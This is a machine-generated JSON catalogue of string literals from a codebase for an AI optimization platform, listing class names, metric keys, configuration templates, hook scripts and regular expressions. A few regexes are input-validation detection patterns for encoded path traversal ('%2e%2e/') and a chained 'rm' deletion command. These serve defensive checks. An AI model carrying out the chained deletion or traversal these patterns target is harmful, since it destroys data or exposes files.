          "category": "identifiers",
          "locations": []
        },
        "DatabaseChecker": {
          "value": "DatabaseChecker",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseClientConfig": {
          "value": "DatabaseClientConfig",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseClientManager": {
          "value": "DatabaseClientManager",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseCompensationHandler": {
          "value": "DatabaseCompensationHandler",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConfig": {
          "value": "DatabaseConfig",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConfigInfo": {
          "value": "DatabaseConfigInfo",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConfigManager": {
          "value": "DatabaseConfigManager",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConnectionError": {
          "value": "DatabaseConnectionError",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConnectionMetrics": {
          "value": "DatabaseConnectionMetrics",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseConstants": {
          "value": "DatabaseConstants",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseDegradationStrategy": {
          "value": "DatabaseDegradationStrategy",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseError": {
          "value": "DatabaseError",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseHealthChecker": {
          "value": "DatabaseHealthChecker",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseIndexManager": {
          "value": "DatabaseIndexManager",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseManager": {
          "value": "DatabaseManager",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseMetrics": {
          "value": "DatabaseMetrics",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseObservability": {
          "value": "DatabaseObservability",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseQueryMetrics": {
          "value": "DatabaseQueryMetrics",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseRetryStrategy": {
          "value": "DatabaseRetryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseService": {
          "value": "DatabaseService",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseSessionManager": {
          "value": "DatabaseSessionManager",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseTestMixin": {
          "value": "DatabaseTestMixin",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseTestUtils": {
          "value": "DatabaseTestUtils",
          "category": "identifiers",
          "locations": []
        },
        "Date": {
          "value": "Date",
          "category": "identifiers",
          "locations": []
        },
        "DateTime": {
          "value": "DateTime",
          "category": "identifiers",
          "locations": []
        },
        "Davis": {
          "value": "Davis",
          "category": "identifiers",
          "locations": []
        },
        "Days": {
          "value": "Days",
          "category": "identifiers",
          "locations": []
        },
        "DbDep": {
          "value": "DbDep",
          "category": "identifiers",
          "locations": []
        },
        "DeadlockError": {
          "value": "DeadlockError",
          "category": "identifiers",
          "locations": []
        },
        "DebugService": {
          "value": "DebugService",
          "category": "identifiers",
          "locations": []
        },
        "DeepAgentState": {
          "value": "DeepAgentState",
          "category": "identifiers",
          "locations": []
        },
        "DeepResearchAPI": {
          "value": "DeepResearchAPI",
          "category": "identifiers",
          "locations": []
        },
        "DefaultContext": {
          "value": "DefaultContext",
          "category": "identifiers",
          "locations": []
        },
        "DefaultHandlers": {
          "value": "DefaultHandlers",
          "category": "identifiers",
          "locations": []
        },
        "DefaultLogTableSettings": {
          "value": "DefaultLogTableSettings",
          "category": "identifiers",
          "locations": []
        },
        "DegradationLevel": {
          "value": "DegradationLevel",
          "category": "identifiers",
          "locations": []
        },
        "DegradationPolicy": {
          "value": "DegradationPolicy",
          "category": "identifiers",
          "locations": []
        },
        "DegradationStrategy": {
          "value": "DegradationStrategy",
          "category": "identifiers",
          "locations": []
        },
        "Delegation": {
          "value": "Delegation",
          "category": "identifiers",
          "locations": []
        },
        "DeleteThreadMessage": {
          "value": "DeleteThreadMessage",
          "category": "identifiers",
          "locations": []
        },
        "DeleteThreadPayload": {
          "value": "DeleteThreadPayload",
          "category": "identifiers",
          "locations": []
        },
        "Deleted": {
          "value": "Deleted",
          "category": "identifiers",
          "locations": []
        },
        "Deleting": {
          "value": "Deleting",
          "category": "identifiers",
          "locations": []
        },
        "Delivered": {
          "value": "Delivered",
          "category": "identifiers",
          "locations": []
        },
        "DemoAgent": {
          "value": "DemoAgent",
          "category": "identifiers",
          "locations": []
        },
        "DemoAnalytics": {
          "value": "DemoAnalytics",
          "category": "identifiers",
          "locations": []
        },
        "DemoChatRequest": {
          "value": "DemoChatRequest",
          "category": "identifiers",
          "locations": []
        },
        "DemoChatResponse": {
          "value": "DemoChatResponse",
          "category": "identifiers",
          "locations": []
        },
        "DemoFeedback": {
          "value": "DemoFeedback",
          "category": "identifiers",
          "locations": []
        },
        "DemoMetrics": {
          "value": "DemoMetrics",
          "category": "identifiers",
          "locations": []
        },
        "DemoMetricsGenerator": {
          "value": "DemoMetricsGenerator",
          "category": "identifiers",
          "locations": []
        },
        "DemoOptimizationAgent": {
          "value": "DemoOptimizationAgent",
          "category": "identifiers",
          "locations": []
        },
        "DemoOptimizationService": {
          "value": "DemoOptimizationService",
          "category": "identifiers",
          "locations": []
        },
        "DemoReportingAgent": {
          "value": "DemoReportingAgent",
          "category": "identifiers",
          "locations": []
        },
        "DemoReportingService": {
          "value": "DemoReportingService",
          "category": "identifiers",
          "locations": []
        },
        "DemoService": {
          "value": "DemoService",
          "category": "identifiers",
          "locations": []
        },
        "DemoSessionFeedbackResponse": {
          "value": "DemoSessionFeedbackResponse",
          "category": "identifiers",
          "locations": []
        },
        "DemoSessionStatus": {
          "value": "DemoSessionStatus",
          "category": "identifiers",
          "locations": []
        },
        "DemoTriageAgent": {
          "value": "DemoTriageAgent",
          "category": "identifiers",
          "locations": []
        },
        "DemoTriageService": {
          "value": "DemoTriageService",
          "category": "identifiers",
          "locations": []
        },
        "DemoWSMessage": {
          "value": "DemoWSMessage",
          "category": "identifiers",
          "locations": []
        },
        "DemoWSResponse": {
          "value": "DemoWSResponse",
          "category": "identifiers",
          "locations": []
        },
        "Dependencies": {
          "value": "Dependencies",
          "category": "identifiers",
          "locations": []
        },
        "DependencyHealthChecker": {
          "value": "DependencyHealthChecker",
          "category": "identifiers",
          "locations": []
        },
        "DependencyInfo": {
          "value": "DependencyInfo",
          "category": "identifiers",
          "locations": []
        },
        "DependencyReport": {
          "value": "DependencyReport",
          "category": "identifiers",
          "locations": []
        },
        "DependencyResolver": {
          "value": "DependencyResolver",
          "category": "identifiers",
          "locations": []
        },
        "DependencyStatus": {
          "value": "DependencyStatus",
          "category": "identifiers",
          "locations": []
        },
        "DependencyType": {
          "value": "DependencyType",
          "category": "identifiers",
          "locations": []
        },
        "DetailedErrorContext": {
          "value": "DetailedErrorContext",
          "category": "identifiers",
          "locations": []
        },
        "Details": {
          "value": "Details",
          "category": "identifiers",
          "locations": []
        },
        "Detected": {
          "value": "Detected",
          "category": "identifiers",
          "locations": []
        },
        "DevLoginRequest": {
          "value": "DevLoginRequest",
          "category": "identifiers",
          "locations": []
        },
        "DevUser": {
          "value": "DevUser",
          "category": "identifiers",
          "locations": []
        },
        "Developer": {
          "value": "Developer",
          "category": "identifiers",
          "locations": []
        },
        "DeveloperDep": {
          "value": "DeveloperDep",
          "category": "identifiers",
          "locations": []
        },
        "DevelopmentConfig": {
          "value": "DevelopmentConfig",
          "category": "identifiers",
          "locations": []
        },
        "DiagnosticConfiguration": {
          "value": "DiagnosticConfiguration",
          "category": "identifiers",
          "locations": []
        },
        "DiagnosticError": {
          "value": "DiagnosticError",
          "category": "identifiers",
          "locations": []
        },
        "DiagnosticResult": {
          "value": "DiagnosticResult",
          "category": "identifiers",
          "locations": []
        },
        "DiagnosticSeverity": {
          "value": "DiagnosticSeverity",
          "category": "identifiers",
          "locations": []
        },
        "DiagnosticsManager": {
          "value": "DiagnosticsManager",
          "category": "identifiers",
          "locations": []
        },
        "Diana": {
          "value": "Diana",
          "category": "identifiers",
          "locations": []
        },
        "Dict": {
          "value": "Dict",
          "category": "identifiers",
          "locations": []
        },
        "Disabled": {
          "value": "Disabled",
          "category": "identifiers",
          "locations": []
        },
        "DisconnectReason": {
          "value": "DisconnectReason",
          "category": "identifiers",
          "locations": []
        },
        "DiscoverToolsResponse": {
          "value": "DiscoverToolsResponse",
          "category": "identifiers",
          "locations": []
        },
        "Discovered": {
          "value": "Discovered",
          "category": "identifiers",
          "locations": []
        },
        "DiscoveredPattern": {
          "value": "DiscoveredPattern",
          "category": "identifiers",
          "locations": []
        },
        "DisplayFormatter": {
          "value": "DisplayFormatter",
          "category": "identifiers",
          "locations": []
        },
        "DiversityMetrics": {
          "value": "DiversityMetrics",
          "category": "identifiers",
          "locations": []
        },
        "Dockerfile": {
          "value": "Dockerfile",
          "category": "identifiers",
          "locations": []
        },
        "Dockerfiles": {
          "value": "Dockerfiles",
          "category": "identifiers",
          "locations": []
        },
        "Document": {
          "value": "Document",
          "category": "identifiers",
          "locations": []
        },
        "DocumentBase": {
          "value": "DocumentBase",
          "category": "identifiers",
          "locations": []
        },
        "DocumentCreate": {
          "value": "DocumentCreate",
          "category": "identifiers",
          "locations": []
        },
        "DocumentManager": {
          "value": "DocumentManager",
          "category": "identifiers",
          "locations": []
        },
        "DocumentUpdate": {
          "value": "DocumentUpdate",
          "category": "identifiers",
          "locations": []
        },
        "Duplicates": {
          "value": "Duplicates",
          "category": "identifiers",
          "locations": []
        },
        "E2ETestInfrastructure": {
          "value": "E2ETestInfrastructure",
          "category": "identifiers",
          "locations": []
        },
        "E2ETestResult": {
          "value": "E2ETestResult",
          "category": "identifiers",
          "locations": []
        },
        "Embeddings": {
          "value": "Embeddings",
          "category": "identifiers",
          "locations": []
        },
        "Enabled": {
          "value": "Enabled",
          "category": "identifiers",
          "locations": []
        },
        "Enabling": {
          "value": "Enabling",
          "category": "identifiers",
          "locations": []
        },
        "Endpoint": {
          "value": "Endpoint",
          "category": "identifiers",
          "locations": []
        },
        "EndpointValidator": {
          "value": "EndpointValidator",
          "category": "identifiers",
          "locations": []
        },
        "EngineeringExpert": {
          "value": "EngineeringExpert",
          "category": "identifiers",
          "locations": []
        },
        "Enhanced": {
          "value": "Enhanced",
          "category": "identifiers",
          "locations": []
        },
        "EnhancedInputValidator": {
          "value": "EnhancedInputValidator",
          "category": "identifiers",
          "locations": []
        },
        "EnhancedRetryConfig": {
          "value": "EnhancedRetryConfig",
          "category": "identifiers",
          "locations": []
        },
        "EnhancedRetryStrategy": {
          "value": "EnhancedRetryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "EnhancedSecretManager": {
          "value": "EnhancedSecretManager",
          "category": "identifiers",
          "locations": []
        },
        "EnhancedStringLiteralCategorizer": {
          "value": "EnhancedStringLiteralCategorizer",
          "category": "identifiers",
          "locations": []
        },
        "EnrichedMetrics": {
          "value": "EnrichedMetrics",
          "category": "identifiers",
          "locations": []
        },
        "Enterprise": {
          "value": "Enterprise",
          "category": "identifiers",
          "locations": []
        },
        "EnterpriseHealthTelemetry": {
          "value": "EnterpriseHealthTelemetry",
          "category": "identifiers",
          "locations": []
        },
        "EntityExtractionError": {
          "value": "EntityExtractionError",
          "category": "identifiers",
          "locations": []
        },
        "EntityExtractor": {
          "value": "EntityExtractor",
          "category": "identifiers",
          "locations": []
        },
        "Entry": {
          "value": "Entry",
          "category": "identifiers",
          "locations": []
        },
        "Enum": {
          "value": "Enum",
          "category": "identifiers",
          "locations": []
        },
        "Environment": {
          "value": "Environment",
          "category": "identifiers",
          "locations": []
        },
        "EnvironmentChecker": {
          "value": "EnvironmentChecker",
          "category": "identifiers",
          "locations": []
        },
        "EnvironmentConfig": {
          "value": "EnvironmentConfig",
          "category": "identifiers",
          "locations": []
        },
        "EnvironmentDetectionResult": {
          "value": "EnvironmentDetectionResult",
          "category": "identifiers",
          "locations": []
        },
        "EnvironmentDetector": {
          "value": "EnvironmentDetector",
          "category": "identifiers",
          "locations": []
        },
        "EnvironmentType": {
          "value": "EnvironmentType",
          "category": "identifiers",
          "locations": []
        },
        "Error": {
          "value": "Error",
          "category": "identifiers",
          "locations": []
        },
        "ErrorAggregation": {
          "value": "ErrorAggregation",
          "category": "identifiers",
          "locations": []
        },
        "ErrorAggregationSystem": {
          "value": "ErrorAggregationSystem",
          "category": "identifiers",
          "locations": []
        },
        "ErrorAggregator": {
          "value": "ErrorAggregator",
          "category": "identifiers",
          "locations": []
        },
        "ErrorAlert": {
          "value": "ErrorAlert",
          "category": "identifiers",
          "locations": []
        },
        "ErrorCategory": {
          "value": "ErrorCategory",
          "category": "identifiers",
          "locations": []
        },
        "ErrorClassification": {
          "value": "ErrorClassification",
          "category": "identifiers",
          "locations": []
        }
      }
    },
    "metrics": {
      "count": 9,
      "literals": {
        "metric_id": {
          "value": "metric_id",
          "category": "metrics",
          "locations": []
        },
        "metric_name": {
          "value": "metric_name",
          "category": "metrics",
          "locations": []
        },
        "metric_name required in metadata": {
          "value": "metric_name required in metadata",
          "category": "metrics",
          "locations": []
        },
        "metric_names": {
          "value": "metric_names",
          "category": "metrics",
          "locations": []
        },
        "metric_status": {
          "value": "metric_status",
          "category": "metrics",
          "locations": []
        },
        "metric_summary": {
          "value": "metric_summary",
          "category": "metrics",
          "locations": []
        },
        "metric_type": {
          "value": "metric_type",
          "category": "metrics",
          "locations": []
        },
        "metric_type,\n                toStartOfHour(timestamp) as hour,\n                avg(value) as avg_value,\n                max(value) as max_value,\n                min(value) as min_value,\n                count() as sample_count": {
          "value": "metric_type,\n                toStartOfHour(timestamp) as hour,\n                avg(value) as avg_value,\n                max(value) as max_value,\n                min(value) as min_value,\n                count() as sample_count",
          "category": "metrics",
          "locations": []
        },
        "metric_value": {
          "value": "metric_value",
          "category": "metrics",
          "locations": []
        }
      }
    },
    "paths": {
      "count": 2198,
      "literals": {
        "\"([^\"]+)\"\\s*:\\s*\"([^\"]*)\"": {
          "value": "\"([^\"]+)\"\\s*:\\s*\"([^\"]*)\"",
          "category": "paths",
          "locations": []
        },
        "\"([^\"]+)\"\\s*:\\s*\"([^\"]*)\"(?=[,}\\]])": {
          "value": "\"([^\"]+)\"\\s*:\\s*\"([^\"]*)\"(?=[,}\\]])",
          "category": "paths",
          "locations": []
        },
        "\"([^\"]+)\"\\s*:\\s*(\\[[^\\]]*\\])": {
          "value": "\"([^\"]+)\"\\s*:\\s*(\\[[^\\]]*\\])",
          "category": "paths",
          "locations": []
        },
        "\"([^\"]+)\"\\s*:\\s*(\\d+\\.?\\d*|true|false|null)(?=[,}\\]]|\\s)": {
          "value": "\"([^\"]+)\"\\s*:\\s*(\\d+\\.?\\d*|true|false|null)(?=[,}\\]]|\\s)",
          "category": "paths",
          "locations": []
        },
        "\"([^\"]+)\"\\s*:\\s*({[^}]*})": {
          "value": "\"([^\"]+)\"\\s*:\\s*({[^}]*})",
          "category": "paths",
          "locations": []
        },
        "\"\\s*:\\s*\\[([^\\]]*)": {
          "value": "\"\\s*:\\s*\\[([^\\]]*)",
          "category": "paths",
          "locations": []
        },
        "\"application/json\"": {
          "value": "\"application/json\"",
          "category": "paths",
          "locations": []
        },
        "\"options\": {\n        \"include_embeddings\": true/false,\n        \"format\": \"json|csv|parquet\",\n        \"compression\": true/false\n    }\n}": {
          "value": "\"options\": {\n        \"include_embeddings\": true/false,\n        \"format\": \"json|csv|parquet\",\n        \"compression\": true/false\n    }\n}",
          "category": "paths",
          "locations": []
        },
        "# ACT Secrets Configuration\n# Add your secrets here (this file is gitignored)\nGITHUB_TOKEN=\nNPM_TOKEN=\nDOCKER_PASSWORD=\nTEST_DATABASE_URL=sqlite:///test.db\nTEST_REDIS_URL=redis://localhost:6379": {
          "value": "# ACT Secrets Configuration\n# Add your secrets here (this file is gitignored)\nGITHUB_TOKEN=\nNPM_TOKEN=\nDOCKER_PASSWORD=\nTEST_DATABASE_URL=sqlite:///test.db\nTEST_REDIS_URL=redis://localhost:6379",
          "category": "paths",
          "locations": []
        },
        "# Agent Modification History\\n# =+\\n((?:# Entry \\d+:.*\\n)*)": {
          "value": "# Agent Modification History\\n# =+\\n((?:# Entry \\d+:.*\\n)*)",
          "category": "paths",
          "locations": []
        },
        "# CORS Configuration\nCORS_ORIGINS=http://localhost:3000,http://localhost:3001,http://127.0.0.1:3000": {
          "value": "# CORS Configuration\nCORS_ORIGINS=http://localhost:3000,http://localhost:3001,http://127.0.0.1:3000",
          "category": "paths",
          "locations": []
        },
        "# ClickHouse container\n        containers[\"clickhouse\"] = {\n            \"url\": \"http://localhost:8124\",\n            \"native_port\": 9001,\n            \"max_connections\": 100\n        }": {
          "value": "# ClickHouse container\n        containers[\"clickhouse\"] = {\n            \"url\": \"http://localhost:8124\",\n            \"native_port\": 9001,\n            \"max_connections\": 100\n        }",
          "category": "paths",
          "locations": []
        },
        "# Database Configuration\nDATABASE_URL=postgresql+asyncpg://postgres:postgres@localhost:5432/netra\nCLICKHOUSE_URL=clickhouse://default:@localhost:9000/default\nREDIS_URL=redis://localhost:6379/0": {
          "value": "# Database Configuration\nDATABASE_URL=postgresql+asyncpg://postgres:postgres@localhost:5432/netra\nCLICKHOUSE_URL=clickhouse://default:@localhost:9000/default\nREDIS_URL=redis://localhost:6379/0",
          "category": "paths",
          "locations": []
        },
        "# FIXME: BaseExecutionEngine not available\\n# \\g<0>": {
          "value": "# FIXME: BaseExecutionEngine not available\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# FIXME: DataSubAgentClickHouseOperations not available\\n# \\g<0>": {
          "value": "# FIXME: DataSubAgentClickHouseOperations not available\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# FIXME: ExecutionEngine not available in execution_engine\\n# \\g<0>": {
          "value": "# FIXME: ExecutionEngine not available in execution_engine\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# FIXME: Metric not available in metrics_collector\\n# \\g<0>": {
          "value": "# FIXME: Metric not available in metrics_collector\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# FIXME: SupervisorAgent not exported from supervisor\\n# \\g<0>": {
          "value": "# FIXME: SupervisorAgent not exported from supervisor\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# FIXME: SupplyResearcherAgent not available\\n# \\g<0>": {
          "value": "# FIXME: SupplyResearcherAgent not available\\n# \\g<0>",
          "category": "paths",
          "locations": []
        },
        "# Frontend Configuration\nFRONTEND_URL=http://localhost:3000\nNEXT_PUBLIC_API_URL=http://localhost:8000\nNEXT_PUBLIC_WS_URL=ws://localhost:8000": {
          "value": "# Frontend Configuration\nFRONTEND_URL=http://localhost:3000\nNEXT_PUBLIC_API_URL=http://localhost:8000\nNEXT_PUBLIC_WS_URL=ws://localhost:8000",
          "category": "paths",
          "locations": []
        },
        "# Generated by fetch_secrets_to_env.py": {
          "value": "# Generated by fetch_secrets_to_env.py",
          "category": "paths",
          "locations": []
        },
        "# Mock implementation.*\\n\\s*pass\\s*$": {
          "value": "# Mock implementation.*\\n\\s*pass\\s*$",
          "category": "paths",
          "locations": []
        },
        "# Netra AI Platform - Development Environment Configuration\n# Generated by install_dev_env.py": {
          "value": "# Netra AI Platform - Development Environment Configuration\n# Generated by install_dev_env.py",
          "category": "paths",
          "locations": []
        },
        "# Optimization Analysis\ncurrent_tokens = {tokens}\ncurrent_cost = {cost}\ncost_per_token = current_cost / current_tokens\noptimization_factor = {factor}\nnew_tokens = current_tokens * optimization_factor\nnew_cost = new_tokens * cost_per_token": {
          "value": "# Optimization Analysis\ncurrent_tokens = {tokens}\ncurrent_cost = {cost}\ncost_per_token = current_cost / current_tokens\noptimization_factor = {factor}\nnew_tokens = current_tokens * optimization_factor\nnew_cost = new_tokens * cost_per_token",
          "category": "paths",
          "locations": []
        },
        "# Performance Benchmarking\nbaseline = {baseline}\ncurrent = {current}\nimprovement = ((current - baseline) / baseline) * 100\nrelative_performance = current / baseline": {
          "value": "# Performance Benchmarking\nbaseline = {baseline}\ncurrent = {current}\nimprovement = ((current - baseline) / baseline) * 100\nrelative_performance = current / baseline",
          "category": "paths",
          "locations": []
        },
        "# PostgreSQL container\n        containers[\"postgres\"] = {\n            \"url\": \"postgresql://test:test@localhost:5433/netra_test\",\n            \"max_connections\": 200,\n            \"pool_size\": 20\n        }": {
          "value": "# PostgreSQL container\n        containers[\"postgres\"] = {\n            \"url\": \"postgresql://test:test@localhost:5433/netra_test\",\n            \"max_connections\": 200,\n            \"pool_size\": 20\n        }",
          "category": "paths",
          "locations": []
        },
        "# Real.*would be.*\\n\\s*pass\\s*$": {
          "value": "# Real.*would be.*\\n\\s*pass\\s*$",
          "category": "paths",
          "locations": []
        },
        "# Redis container\n        containers[\"redis\"] = {\n            \"url\": \"redis://localhost:6380\",\n            \"max_memory\": \"256mb\",\n            \"max_clients\": 10000\n        }\n        \n        yield containers\n    \n    async def test_": {
          "value": "# Redis container\n        containers[\"redis\"] = {\n            \"url\": \"redis://localhost:6380\",\n            \"max_memory\": \"256mb\",\n            \"max_clients\": 10000\n        }\n        \n        yield containers\n    \n    async def test_",
          "category": "paths",
          "locations": []
        },
        "# TCO Analysis\nmonthly_cost = {monthly_cost}\nannual_cost = monthly_cost * 12\nefficiency_factor = {efficiency_factor}\noptimized_cost = annual_cost * efficiency_factor\nsavings = annual_cost - optimized_cost\nroi = (savings / annual_cost) * 100": {
          "value": "# TCO Analysis\nmonthly_cost = {monthly_cost}\nannual_cost = monthly_cost * 12\nefficiency_factor = {efficiency_factor}\noptimized_cost = annual_cost * efficiency_factor\nsavings = annual_cost - optimized_cost\nroi = (savings / annual_cost) * 100",
          "category": "paths",
          "locations": []
        },
        "# Test stub.*\\n\\s*pass\\s*$": {
          "value": "# Test stub.*\\n\\s*pass\\s*$",
          "category": "paths",
          "locations": []
        },
        "#!/bin/bash\n# AI Agent Metadata Archive Hook\n\necho \"Archiving metadata to audit log...\"\n\n# Archive metadata\npython scripts/metadata_archiver.py --archive\n\necho \"✅ Metadata archived\"\nexit 0": {
          "value": "#!/bin/bash\n# AI Agent Metadata Archive Hook\n\necho \"Archiving metadata to audit log...\"\n\n# Archive metadata\npython scripts/metadata_archiver.py --archive\n\necho \"✅ Metadata archived\"\nexit 0",
          "category": "paths",
          "locations": []
        },
        "#!/bin/bash\n# AI Agent Metadata Validation Hook\n\necho \"Validating AI agent metadata headers...\"\n\n# Run metadata validator\npython scripts/metadata_validator.py --validate-all\n\nif [ $? -ne 0 ]; then\n    echo \"❌ Metadata validation failed. Please fix metadata headers before committing.\"\n    exit 1\nfi\n\necho \"✅ Metadata validation passed\"\nexit 0": {
          "value": "#!/bin/bash\n# AI Agent Metadata Validation Hook\n\necho \"Validating AI agent metadata headers...\"\n\n# Run metadata validator\npython scripts/metadata_validator.py --validate-all\n\nif [ $? -ne 0 ]; then\n    echo \"❌ Metadata validation failed. Please fix metadata headers before committing.\"\n    exit 1\nfi\n\necho \"✅ Metadata validation passed\"\nexit 0",
          "category": "paths",
          "locations": []
        },
        "#!/usr/bin/env python3\n\"\"\"": {
          "value": "#!/usr/bin/env python3\n\"\"\"",
          "category": "paths",
          "locations": []
        },
        "## Known Issues and Risks\n\n### Performance Considerations\n- Review caching implementation in LLM cache service\n- Check database query optimization opportunities\n- Monitor WebSocket connection pool performance\n\n### Security Considerations\n- Ensure all API endpoints have proper authentication\n- Verify OAuth token validation is working correctly\n- Check for any exposed secrets or API keys\n\n### Technical Debt\n- **Total TODO/FIXME items**:": {
          "value": "## Known Issues and Risks\n\n### Performance Considerations\n- Review caching implementation in LLM cache service\n- Check database query optimization opportunities\n- Monitor WebSocket connection pool performance\n\n### Security Considerations\n- Ensure all API endpoints have proper authentication\n- Verify OAuth token validation is working correctly\n- Check for any exposed secrets or API keys\n\n### Technical Debt\n- **Total TODO/FIXME items**:",
          "category": "paths",
          "locations": []
        },
        "## Next Steps\n\n1. **Run smoke tests** to verify basic functionality\n2. **Test agent workflows** end-to-end\n3. **Monitor WebSocket traffic** in dev tools\n4. **Add e2e tests** for critical event flows\n5. **Document event catalog** in SPEC/websocket_communication.xml": {
          "value": "## Next Steps\n\n1. **Run smoke tests** to verify basic functionality\n2. **Test agent workflows** end-to-end\n3. **Monitor WebSocket traffic** in dev tools\n4. **Add e2e tests** for critical event flows\n5. **Document event catalog** in SPEC/websocket_communication.xml",
          "category": "paths",
          "locations": []
        },
        "## 🛠️ Available Tools\n- `python scripts/boundary_enforcer.py --enforce` - Full boundary check\n- `python scripts/auto_split_files.py --scan` - Automated file splitting\n- `python scripts/auto_decompose_functions.py --scan` - Function decomposition\n- `python scripts/emergency_boundary_actions.py --assess` - Emergency assessment\n\n---\n*Generated by Boundary Enforcement System v2.0 | Timestamp:": {
          "value": "## 🛠️ Available Tools\n- `python scripts/boundary_enforcer.py --enforce` - Full boundary check\n- `python scripts/auto_split_files.py --scan` - Automated file splitting\n- `python scripts/auto_decompose_functions.py --scan` - Function decomposition\n- `python scripts/emergency_boundary_actions.py --assess` - Emergency assessment\n\n---\n*Generated by Boundary Enforcement System v2.0 | Timestamp:",
          "category": "paths",
          "locations": []
        },
        "### 1. ✅ Event Structure Mismatch - FIXED\n**Previous:** Backend used two different message structures\n**Fixed:** All messages now use consistent `{type, payload}` structure\n- Standardized ws_manager.py\n- Updated message_handler.py\n- Fixed quality_message_handler.py\n- Updated message_handlers.py": {
          "value": "### 1. ✅ Event Structure Mismatch - FIXED\n**Previous:** Backend used two different message structures\n**Fixed:** All messages now use consistent `{type, payload}` structure\n- Standardized ws_manager.py\n- Updated message_handler.py\n- Fixed quality_message_handler.py\n- Updated message_handlers.py",
          "category": "paths",
          "locations": []
        },
        "#/definitions/": {
          "value": "#/definitions/",
          "category": "paths",
          "locations": []
        },
        "#\\s*#\\s*([^#]+)# Possibly broken comprehension": {
          "value": "#\\s*#\\s*([^#]+)# Possibly broken comprehension",
          "category": "paths",
          "locations": []
        },
        "#\\s*JUSTIFICATION:": {
          "value": "#\\s*JUSTIFICATION:",
          "category": "paths",
          "locations": []
        },
        "#\\s*Justification:": {
          "value": "#\\s*Justification:",
          "category": "paths",
          "locations": []
        },
        "#\\s*Mock justification:": {
          "value": "#\\s*Mock justification:",
          "category": "paths",
          "locations": []
        },
        "#\\s*Mock needed": {
          "value": "#\\s*Mock needed",
          "category": "paths",
          "locations": []
        },
        "#\\s*Necessary because": {
          "value": "#\\s*Necessary because",
          "category": "paths",
          "locations": []
        },
        "#\\s*Required for": {
          "value": "#\\s*Required for",
          "category": "paths",
          "locations": []
        },
        "#\\s*Required for.*test": {
          "value": "#\\s*Required for.*test",
          "category": "paths",
          "locations": []
        },
        "#\\s*[Jj]ustification:": {
          "value": "#\\s*[Jj]ustification:",
          "category": "paths",
          "locations": []
        },
        "#\\s+([^#\\n]+)# Possibly broken comprehension": {
          "value": "#\\s+([^#\\n]+)# Possibly broken comprehension",
          "category": "paths",
          "locations": []
        },
        "$180/month (14%)": {
          "value": "$180/month (14%)",
          "category": "paths",
          "locations": []
        },
        "$220/month (17%)": {
          "value": "$220/month (17%)",
          "category": "paths",
          "locations": []
        },
        "$245/month": {
          "value": "$245/month",
          "category": "paths",
          "locations": []
        },
        "$280/month": {
          "value": "$280/month",
          "category": "paths",
          "locations": []
        },
        "$315/month": {
          "value": "$315/month",
          "category": "paths",
          "locations": []
        },
        "$425/month (32%)": {
          "value": "$425/month (32%)",
          "category": "paths",
          "locations": []
        },
        "$450/month": {
          "value": "$450/month",
          "category": "paths",
          "locations": []
        },
        "% goal\n\n## Configuration\nTo enable continuous autonomous review, add to CI/CD:\n```bash\npython scripts/test_autonomous_review.py --auto\n```\n\nOr schedule hourly reviews:\n```bash\n0 * * * * cd /path/to/project && python scripts/test_autonomous_review.py --continuous\n```": {
          "value": "% goal\n\n## Configuration\nTo enable continuous autonomous review, add to CI/CD:\n```bash\npython scripts/test_autonomous_review.py --auto\n```\n\nOr schedule hourly reviews:\n```bash\n0 * * * * cd /path/to/project && python scripts/test_autonomous_review.py --continuous\n```",
          "category": "paths",
          "locations": []
        },
        "%2e%2e\\/": {
          "value": "%2e%2e\\/",
          "category": "paths",
          "locations": []
        },
        "%</div>\n                    <div class=\"metric-label\">Overall Health Score</div>\n                </div>": {
          "value": "%</div>\n                    <div class=\"metric-label\">Overall Health Score</div>\n                </div>",
          "category": "paths",
          "locations": []
        },
        "%</p>\n<h2>Issues</h2>\n<ul>": {
          "value": "%</p>\n<h2>Issues</h2>\n<ul>",
          "category": "paths",
          "locations": []
        },
        "%Y/%m/%d": {
          "value": "%Y/%m/%d",
          "category": "paths",
          "locations": []
        },
        "%[sd]|%\\([^)]+\\)": {
          "value": "%[sd]|%\\([^)]+\\)",
          "category": "paths",
          "locations": []
        },
        "%m/%d/%Y": {
          "value": "%m/%d/%Y",
          "category": "paths",
          "locations": []
        },
        "&#x\\w+;": {
          "value": "&#x\\w+;",
          "category": "paths",
          "locations": []
        },
        "&&\\s*rm": {
          "value": "&&\\s*rm",
          "category": "paths",
          "locations": []
        },
        "&\\w+;": {
          "value": "&\\w+;",
          "category": "paths",
          "locations": []
        },
        "' not found[/red]": {
          "value": "' not found[/red]",
          "category": "paths",
          "locations": []
        },
        "' not found[/yellow]": {
          "value": "' not found[/yellow]",
          "category": "paths",
          "locations": []
        },
        "' removed[/green]": {
          "value": "' removed[/green]",
          "category": "paths",
          "locations": []
        },
        "' saved[/green]": {
          "value": "' saved[/green]",
          "category": "paths",
          "locations": []
        },
        "', metrics.name) as idx, if(idx > 0, arrayElement(metrics.value, idx), 0.0) as metric_value, if(baseline.std_val > 0, (toFloat64(metric_value) - baseline.mean_val) / baseline.std_val, 0.0) as z_score, abs(z_score) >": {
